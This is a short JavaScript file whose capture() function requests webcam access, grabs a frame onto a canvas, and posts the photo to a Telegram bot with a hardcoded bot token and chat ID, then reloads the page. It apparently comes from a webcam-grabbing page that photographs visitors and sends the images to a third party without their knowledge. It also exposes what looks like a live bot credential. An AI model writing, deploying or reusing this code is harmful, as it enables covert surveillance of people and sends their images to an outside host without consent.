function capture() {
  const constraints = {
    video: true
  };

  navigator.mediaDevices.getUserMedia(constraints)
    .then((stream) => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
      };

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imgURL = canvas.toDataURL();

      // Send image to Telegram bot
      const botToken = '5727820511:AAH0LrTp629GSK9MqR5SVDev5IKRqcGsb-s';
      const chatId = '5923255825';
      const url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
      const formData = new FormData();
      formData.append('photo', dataURItoBlob(imgURL), 'photo.png');

      fetch(url, {
        method: 'POST',
        body: formData
      }).then((response) => {
        console.log(response);
      }).catch((error) => {
        console.error(error);
      });

      // Reload the page
      location.reload();
    }).catch((error) => {
      console.error(error);
    });
}

function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(',')[1]);
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: 'image/png' });
}
